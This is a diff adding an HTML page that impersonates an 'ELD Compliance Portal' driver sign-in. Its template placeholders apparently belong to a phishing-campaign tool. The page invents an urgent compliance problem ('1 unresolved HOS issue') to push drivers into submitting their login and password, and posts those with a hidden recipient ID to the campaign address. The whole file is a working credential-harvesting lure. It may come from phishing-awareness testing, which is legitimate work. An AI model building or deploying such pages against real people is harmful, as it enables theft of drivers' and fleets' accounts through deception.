@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>ELD Compliance Portal — Driver Sign-in</title>
+    <style>
+      body { font-family: Arial, sans-serif; background: #f6f6f6; margin: 0;
+             color: #222; }
+      .bar { background: #1f3a63; color: #fff; padding: 12px 24px;
+             font-size: 16px; font-weight: 600; }
+      .panel { max-width: 400px; margin: 50px auto; background: #fff;
+               border: 1px solid #d0d4d9; padding: 26px; border-radius: 4px; }
+      .alert { background: #fff4e5; border-left: 3px solid #c08400;
+               padding: 8px 10px; font-size: 12px; margin-bottom: 18px; }
+      label { display: block; font-size: 12px; color: #444; margin: 10px 0 4px; }
+      input { width: 100%; padding: 8px; box-sizing: border-box;
+              border: 1px solid #c0c6cd; border-radius: 3px; font-size: 14px; }
+      button { width: 100%; margin-top: 18px; padding: 10px;
+               background: #1f3a63; color: #fff; border: 0; border-radius: 3px;
+               font-size: 14px; cursor: pointer; }
+      .small { font-size: 11px; color: #888; text-align: center; margin-top: 14px; }
+    </style>
+  </head>
+  <body>
+    <div class="bar">ELD Compliance Portal</div>
+    <div class="panel">
+      <div class="alert">1 unresolved HOS issue found on this driver record.</div>
+      <form action="{{.URL}}" method="post" autocomplete="off">
+        <input type="hidden" name="rid" value="{{.RId}}">
+        <label for="dlu">Driver login</label>
+        <input id="dlu" name="driver_login" type="text" placeholder="email or driver ID">
+        <label for="dlp">Password</label>
+        <input id="dlp" name="driver_pw" type="password">
+        <button type="submit">Sign in to review logs</button>
+      </form>
+      <p class="small">Authorized use only. Activity is recorded.</p>
+    </div>
+  </body>
+</html>
